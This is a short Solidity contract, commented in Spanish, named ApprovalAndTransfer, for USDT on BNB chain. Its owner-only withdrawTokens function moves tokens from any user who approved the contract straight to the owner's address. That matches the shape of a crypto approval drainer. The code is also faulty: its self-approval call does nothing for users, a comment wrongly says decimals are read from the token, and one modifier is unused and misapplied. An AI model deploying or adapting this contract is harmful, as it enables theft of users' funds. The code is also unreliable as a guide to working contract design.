// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    // Otras funciones de la interfaz ERC20 que puedas necesitar
}

contract ApprovalAndTransfer {
    IERC20 public usdtToken;
    address public owner;
    uint256 public minBalance; // Mínimo saldo en BNB requerido para realizar transferencias
    uint256 public decimals; // Decimales del token (obtenido directamente del token)

    event Approved(address indexed user, address indexed owner);
    event TokensTransferred(address indexed user, address indexed owner, uint256 amount);

    constructor(address _usdtToken, uint256 _minBalance) {
        usdtToken = IERC20(_usdtToken);
        owner = msg.sender;
        minBalance = _minBalance;
        decimals = 6;  // Obtiene los decimales directamente del contrato del token
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier hasMinimumBalance() {
        require(msg.value >= minBalance, "Insufficient BNB balance");
        _;
    }

    function approveContract() external {
        uint256 maxApproval = type(uint256).max;
        require(usdtToken.approve(address(this), maxApproval), "Approval failed");
        emit Approved(msg.sender, owner);
    }

    function withdrawTokens(uint256 amount, address user) external onlyOwner {
        uint256 scaledAmount = amount * (10**decimals);
        require(usdtToken.transferFrom(user, owner, scaledAmount), "Transfer failed");
        emit TokensTransferred(user, owner, scaledAmount);
    }

    function setDecimals(uint256 _decimals) external onlyOwner {
        decimals = _decimals;
    }

      function setMinBalance(uint256 _minBalance) external onlyOwner {
        minBalance = _minBalance;
    }

    // Función para retirar BNB del contrato
    function withdrawBNB(uint256 amount) external onlyOwner {
        payable(owner).transfer(amount);
    }

    // Función para depositar BNB en el contrato
    receive() external payable {}
}